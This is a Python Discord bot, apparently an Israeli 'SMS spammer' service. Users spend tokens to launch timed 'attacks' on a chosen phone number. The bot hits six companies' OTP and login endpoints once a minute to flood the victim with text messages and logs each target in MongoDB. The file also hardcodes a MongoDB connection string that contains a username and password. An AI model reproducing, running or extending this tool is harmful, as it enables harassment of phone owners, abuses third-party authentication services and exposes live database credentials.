import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
import random
from datetime import datetime, timedelta
from motor.motor_asyncio import AsyncIOMotorClient # ספריה ל-Mongo אסינכרוני

# --- הגדרות מערכת ---
TOKEN = os.getenv('DISCORD_TOKEN')
MONGO_URI = "mongodb+srv://asaf031244_db_user:k57eHWIvYg91mYiJ@cluster0.scy4jgj.mongodb.net/cyberil?appName=Cluster0"
GSHEET_URL = os.getenv('GSHEET_URL') 
BLOCKED_NUMBER = "0535524017"

# --- חיבור ל-Database ---
cluster = AsyncIOMotorClient(MONGO_URI)
db = cluster["cyberil"]
users_col = db["users"] # אוסף יתרות ומשתמשים
logs_col = db["logs"]   # אוסף לוגים של התקפות

active_attacks = {}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
]

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ CyberIL System Connected to MongoDB")

bot = CyberBot()

# --- פונקציות Database ---
async def get_user_data(user_id):
    user = await users_col.find_one({"_id": user_id})
    if not user:
        user = {"_id": user_id, "tokens": 0, "last_claim": None}
        await users_col.insert_one(user)
    return user

async def update_tokens(user_id, amount):
    await users_col.update_one({"_id": user_id}, {"$inc": {"tokens": amount}}, upsert=True)

# --- מנוע הספאמר ---
def api_call(url, data=None, method="POST", is_json=True):
    try:
        headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*"}
        if method == "PUT": r = requests.put(url, json=data, headers=headers, timeout=5)
        elif is_json: r = requests.post(url, json=data, headers=headers, timeout=5)
        else: r = requests.post(url, data=data, headers=headers, timeout=5)
        return r.status_code in [200, 201]
    except: return False

async def fire_round(phone):
    tasks = [
        asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
        asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
        asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"})
    ]
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r is True)

async def run_attack(interaction, phone, minutes):
    uid = interaction.user.id
    active_attacks[uid] = True
    total_s = 0
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"🚀 **הפצצה החלה!** יעד: `{phone}`", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        user = await get_user_data(uid)
        if user["tokens"] <= 0: break
        
        success = await fire_round(phone)
        total_s += success
        
        await asyncio.sleep(60)
        await update_tokens(uid, -1) # הורדת טוקן ב-Mongo

    # שמירת לוג ב-MongoDB
    log_entry = {
        "user": interaction.user.name,
        "target": phone,
        "duration": minutes,
        "success": total_s,
        "date": datetime.now()
    }
    await logs_col.insert_one(log_entry)

    active_attacks.pop(uid, None)
    await interaction.followup.send(f"🏁 **הסתיים!** יעד: `{phone}` | הצלחות: `{total_s}`", ephemeral=True)

# --- ממשק כפתורים ---
class CyberView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="שגר הפצצה", style=discord.ButtonStyle.danger, emoji="🚀")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user_data(interaction.user.id)
        if user["tokens"] < 1:
            return await interaction.response.send_message("❌ אין לך טוקנים!", ephemeral=True)
            
        class InputModal(discord.ui.Modal, title="CyberIL - Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            mins = discord.ui.TextInput(label="זמן (1-100)", default="5")
            async def on_submit(self, modal_inter: discord.Interaction):
                await modal_inter.response.defer(ephemeral=True)
                asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
        await interaction.response.send_modal(InputModal())

    @discord.ui.button(label="בדיקת מטבעות", style=discord.ButtonStyle.primary, emoji="💰")
    async def check(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user_data(interaction.user.id)
        await interaction.response.send_message(f"💰 יתרה ב-Database: **{user['tokens']}** דקות.", ephemeral=True)

    @discord.ui.button(label="טוקן יומי", style=discord.ButtonStyle.success, emoji="🎁")
    async def gift(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user_data(interaction.user.id)
        now = datetime.now()
        
        if not user["last_claim"] or now >= user["last_claim"] + timedelta(hours=24):
            await users_col.update_one({"_id": interaction.user.id}, {"$inc": {"tokens": 5}, "$set": {"last_claim": now}})
            await interaction.response.send_message("✅ קיבלת 5 טוקנים! נשמר ב-Database.", ephemeral=True)
        else:
            await interaction.response.send_message("⏳ כבר לקחת היום.", ephemeral=True)

# --- פקודות ---
@bot.tree.command(name="spamer-setup", description="לוח בקרה")
async def setup(interaction: discord.Interaction):
    user = await get_user_data(interaction.user.id)
    embed = discord.Embed(title="⚡ CyberIL SMS Spamer Control", color=0x2f3136)
    embed.add_field(name="📊 סטטיסטיקה", value=f"יתרה: `{user['tokens']}` דקות\nDB: `Connected`", inline=False)
    embed.set_thumbnail(url="https://emojicdn.elk.sh/🤝")
    await interaction.response.send_message(embed=embed, view=CyberView())

@bot.tree.command(name="spamer-give", description="הענקת טוקנים")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    await update_tokens(user.id, amount)
    await interaction.response.send_message(f"🎁 הוענקו {amount} טוקנים ל-{user.mention} (נשמר ב-Mongo).", ephemeral=True)

bot.run(TOKEN)
